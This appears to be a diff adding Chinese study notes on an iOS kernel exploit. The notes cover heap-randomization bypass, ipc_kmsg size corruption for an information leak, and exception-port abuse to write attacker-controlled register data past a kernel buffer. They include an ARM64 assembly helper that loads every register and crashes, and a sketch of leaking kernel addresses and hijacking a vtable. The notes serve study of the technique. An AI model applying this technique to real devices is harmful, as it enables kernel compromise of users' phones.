@@ -1,0 +1,48 @@
+如果申请大小在2048到4096，那么可以一次申请一页，因此可以绕过页内随机化。
+
+另外kmsg是这次利用的主题 
+struct ipc_kmsg {
+  mach_msg_size_t ikm_size;
+  struct ipc_kmsg * ikm_next;
+  struct ipc_kmsg * ikm_prev;
+  mach_msg_header_t * ikm_header;
+  ipc_port_t ikm_prealloc;
+  ipc_port_t ikm_voucher;
+  mach_msg_priority_t ikm_qos;
+  mach_msg_priority_t ikm_qos_override
+  struct ipc_importance_elem * ikm_importance;
+  queue_chain_t ikm_inheritance;
+};
+
+通过更改 kmsg的size来进行信息泄漏
+
+传递一个exception_mask 的EXC_MASK_ALL，EXCEPTION_STATE 的行为和ARM_THREAD_STATE64 为new_flavor 意味着内核将发送exception_raise_state 消息，我们指定每当指定线程错误的异常端口。该消息将包含所有ARM64通用目标寄存器的状态，这就是我们将用于从ipc_kmsg 缓冲区末尾写入受控数据的内容！
+
+在我们的iOS XCode项目中，我们可以添加一个新的程序集文件并定义一个函数load_regs_and_crash ：
+
+.globl _load_regs_and_crash
+.align 2
+_load_regs_and_crash：
+mov x30，x0
+ldp x0，x1，[x30,0]
+ldp x2，x3，[x30,0x10]
+ldp x4，x5，[x30,0x20]
+ldp x6，x7，[x30,0x30]
+ldp x8，x9，[x30,0x40]
+ldp x10，x11，[x30,0x50]
+ldp x12，x13，[x30,0x60]
+ldp x14，x15，[x30,0x70]
+ldp x16，x17，[x30,0x80]
+ldp x18，x19，[x30,0x90]
+ldp x20，x21，[x30,0xa0]
+ldp x22，x23，[x30,0xb0]
+ldp x24，x25，[x30,0xc0]
+ldp x26，x27，[x30,0xd0]
+ldp x28，x29，[x30,0xe0]
+brk 0
+.align 3
+
+
+信息泄漏出堆地址，然后释放第二个msg，更改为OSSerializer :: serialize
+
+泄漏内核地址，更改虚表指针
